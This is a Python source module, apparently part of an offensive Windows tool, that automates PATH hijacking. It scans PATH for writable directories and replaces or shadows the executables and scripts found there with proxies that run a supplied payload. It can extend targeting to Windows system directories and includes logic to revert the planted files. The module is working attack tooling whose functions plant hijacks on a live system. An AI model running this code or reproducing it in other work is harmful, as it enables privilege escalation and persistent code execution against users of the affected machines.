from __future__ import annotations

from pathlib import Path

from .. import ui as console
from ..core.common import (
    ALBARAN_NAME,
    PAYLOAD_FALLBACK,
    PAYLOAD_NAME,
    albaran_path,
    albaran_read,
    albaran_write,
    is_orig_sidecar,
    live_from_orig,
    orig_sidecar,
)
from ..core.compiler import Compiler
from .kinds import KINDS
from .script import remove_ps1_cmd_sidecar
from ..core.pathscan import (
    _norm_path,
    auto_targets,
    hijackable_files,
    is_windows_dir,
    is_writable,
    scan_path_dirs,
    shadow_plan,
)


def _iter_files(folder: Path) -> list[Path]:
    try:
        items = list(folder.iterdir())
    except OSError:
        return []
    out: list[Path] = []
    for path in items:
        try:
            if path.is_file():
                out.append(path)
        except OSError:
            continue
    return out


def _files(folder: Path, ext: str) -> list[Path]:
    return [p for p in _iter_files(folder) if p.suffix.lower() == ext]


def _origs(folder: Path, ext: str) -> list[Path]:
    return [
        p
        for p in _iter_files(folder)
        if p.suffix.lower() == ext and is_orig_sidecar(p)
    ]


def _has_any_orig(folder: Path) -> bool:
    return any(_origs(folder, kind.ext) for kind in KINDS)


def _revert_file(orig: Path) -> str | None:
    live = live_from_orig(orig)
    try:
        if live.exists():
            live.unlink()
        orig.rename(live)
    except OSError as exc:
        return str(exc)
    if live.suffix.lower() == ".ps1":
        remove_ps1_cmd_sidecar(live)
    return None


def _maybe_remove_payload(folder: Path) -> str | None:
    if _has_any_orig(folder):
        return None
    payload = folder / PAYLOAD_NAME
    if not payload.exists():
        return None
    try:
        payload.unlink()
        console.info(f"{PAYLOAD_NAME}  removed")
    except OSError as exc:
        return str(exc)
    return None


def _remove_fallback_payload() -> str | None:
    if not PAYLOAD_FALLBACK.exists():
        return None
    try:
        PAYLOAD_FALLBACK.unlink()
        console.info(f"{PAYLOAD_FALLBACK}  removed")
    except OSError as exc:
        return str(exc)
    return None


def _revert_origs(origs: list[Path]) -> tuple[int, int]:
    rc = 0
    restored = 0
    for orig in origs:
        live = live_from_orig(orig)
        err = _revert_file(orig)
        if err:
            rc = 2
            console.fail(f"{orig.name} -> {live.name}  {err}")
        else:
            restored += 1
            console.ok(f"{live.name}  restored")
    return rc, restored


def _want_name(name: str, kinds) -> bool:
    ext = Path(name).suffix.lower()
    if any(k.ext == ext for k in kinds):
        return True
    if ext == ".cmd" and any(k.ext == ".ps1" for k in kinds):
        return True
    return False


def _related(only: str | None, name: str) -> bool:
    if only is None:
        return True
    if name.lower() == only.lower():
        return True
    target, other = Path(only), Path(name)
    if target.suffix.lower() == ".ps1" and other.name.lower() == f"{target.stem}.cmd".lower():
        return True
    return False


def _revert_plant(folder: Path, name: str) -> str | None:
    path = folder / name
    if not path.exists():
        return None
    try:
        path.unlink()
    except OSError as exc:
        return str(exc)
    return None


def _revert_albaran(folder: Path, kinds, only: str | None = None) -> tuple[int, int]:
    entries = albaran_read(folder)
    if not entries:
        return 0, 0
    kept: list[tuple[str, str, str]] = []
    rc = 0
    done = 0
    origs = [row for row in entries if row[0] == "orig"]
    plants = [row for row in entries if row[0] != "orig"]
    for action, name, extra in origs + plants:
        if not _want_name(name, kinds) or not _related(only, name):
            kept.append((action, name, extra))
            continue
        if action == "orig":
            sidecar = extra or orig_sidecar(Path(name)).name
            err = _revert_file(folder / sidecar)
            if err:
                rc = 2
                console.fail(f"{name}  {err}")
                kept.append((action, name, extra))
            else:
                done += 1
                console.ok(f"{name}  restored")
        elif action == "plant":
            err = _revert_plant(folder, name)
            if err:
                rc = 2
                console.fail(f"{name}  {err}")
                kept.append((action, name, extra))
            else:
                done += 1
                console.ok(f"{name}  removed")
        else:
            kept.append((action, name, extra))
    albaran_write(folder, kept)
    return rc, done


def _revert_dirs(dirs: list[Path], kinds=KINDS) -> int:
    if not dirs:
        console.warn("nothing to revert")
        return 0

    rc = 0
    restored = 0
    for folder in dirs:
        console.section(str(folder))
        if albaran_path(folder).is_file():
            d_rc, d_ok = _revert_albaran(folder, kinds)
            rc = rc or d_rc
            restored += d_ok
            if d_ok == 0:
                console.info("nothing to revert")
        else:
            origs: list[Path] = []
            for kind in kinds:
                origs.extend(_origs(folder, kind.ext))
            if not origs:
                console.info("nothing to revert")
                continue
            d_rc, d_ok = _revert_origs(origs)
            rc = rc or d_rc
            restored += d_ok
        err = _maybe_remove_payload(folder)
        if err:
            rc = 2
            console.fail(f"{PAYLOAD_NAME}  {err}")
    console.section("summary")
    console.ok(f"restored {restored}")
    return rc


def _proxy_into(
    src: Path,
    dest: Path,
    payload: str,
    skip: str | None,
    compilers: list[Compiler] | None,
    kinds,
) -> int:
    rc = 0
    work = False
    for kind in kinds:
        files = [path for path in _files(src, kind.ext) if not is_orig_sidecar(path)]
        if not files:
            continue
        work = True
        console.info(f"{len(files)} {kind.ext[1:]}")
        for path in files:
            console.debug(str(path))
        result = kind.proxy(
            input=src,
            output=dest,
            payload=payload,
            skip=skip,
            keep_going=True,
            compilers=compilers,
        )
        if result != 0:
            rc = result
    if not work:
        console.info("empty  skip")
    return rc


def _run_auto_shadow(
    payload: str,
    skip: str | None,
    compilers: list[Compiler] | None,
    kinds,
    unsafe: bool,
) -> int:
    plan = shadow_plan(unsafe=unsafe)
    if plan is None:
        console.warn("no ranked writable PATH dir outside the user profile")
        return 0
    dest, sources = plan
    n = sum(len(hijackable_files(item.path, [k.ext for k in kinds])) for item in sources)
    console.section(str(dest.path))
    console.info(f"#{dest.rank}  shadow dest  {n} hijackable")
    if console.is_verbose():
        for item in scan_path_dirs():
            if item.rank is None or dest.rank is None or item.rank <= dest.rank:
                continue
            if not item.exists:
                why = "missing"
            elif item.writable:
                why = "writable"
            elif not unsafe and is_windows_dir(item.path):
                why = "windows"
            else:
                continue
            console.debug(f"#{item.rank}  skip  {why}  {item.path}")
    if not sources:
        console.warn("no later unwritable PATH dirs")
        return 0
    rc = 0
    for item in sources:
        console.section(f"#{item.rank}  {item.path}")
        rc = rc or _proxy_into(item.path, dest.path, payload, skip, compilers, kinds)
    return rc


def run_auto(
    payload: str,
    skip: str | None = None,
    compilers: list[Compiler] | None = None,
    kinds=KINDS,
    shadow: bool = False,
    unsafe: bool = False,
) -> int:
    if shadow:
        return _run_auto_shadow(payload, skip, compilers, kinds, unsafe)

    targets = auto_targets(unsafe=unsafe)
    if not targets:
        console.warn("no writable PATH dirs outside the user profile")
        return 0

    rc = 0
    for item in targets:
        folder = item.path
        console.section(str(folder))
        work = False
        for kind in kinds:
            if not _files(folder, kind.ext):
                continue
            work = True
            result = kind.proxy(
                input=folder,
                output=folder,
                payload=payload,
                skip=skip,
                keep_going=True,
                compilers=compilers,
            )
            if result != 0:
                rc = result
        if not work:
            console.info("empty  skip")
    return rc


def writable_albaran_dirs() -> list[Path]:
    seen: set[str] = set()
    out: list[Path] = []
    folders = [item.path for item in scan_path_dirs() if item.exists and item.writable]
    try:
        cwd = Path.cwd()
        if is_writable(cwd):
            folders.append(cwd)
    except OSError:
        pass
    for folder in folders:
        key = _norm_path(folder)
        if key in seen:
            continue
        seen.add(key)
        if albaran_path(folder).is_file():
            out.append(folder)
    return out


def _orig_for_file(path: Path) -> Path | None:
    if is_orig_sidecar(path):
        return path if path.is_file() else None
    sidecar = orig_sidecar(path)
    if sidecar.is_file():
        return sidecar
    return None


def run_revert(target: str | Path | None = None, kinds=KINDS, unsafe: bool = False) -> int:
    if target is None:
        del unsafe
        dirs = writable_albaran_dirs()
        rc = 0
        if not dirs:
            console.warn(f"no {ALBARAN_NAME} in writable PATH dirs")
        else:
            rc = _revert_dirs(dirs, kinds)
        err = _remove_fallback_payload()
        if err:
            console.fail(f"{PAYLOAD_NAME}  {err}")
            rc = 2
        return rc

    path = Path(target)
    if path.is_file():
        folder = path.parent
        console.section(str(folder))
        if albaran_path(folder).is_file():
            rc, restored = _revert_albaran(folder, kinds, only=path.name)
        else:
            orig = _orig_for_file(path)
            if orig is None:
                console.fail(f"no albaran / .original sidecar  {path}")
                return 1
            rc, restored = _revert_origs([orig])
        err = _maybe_remove_payload(folder)
        if err:
            rc = 2
            console.fail(f"{PAYLOAD_NAME}  {err}")
        console.section("summary")
        console.ok(f"restored {restored}")
        return rc
    if path.is_dir():
        return _revert_dirs([path], kinds)
    console.fail(f"input does not exist  {path}")
    return 1
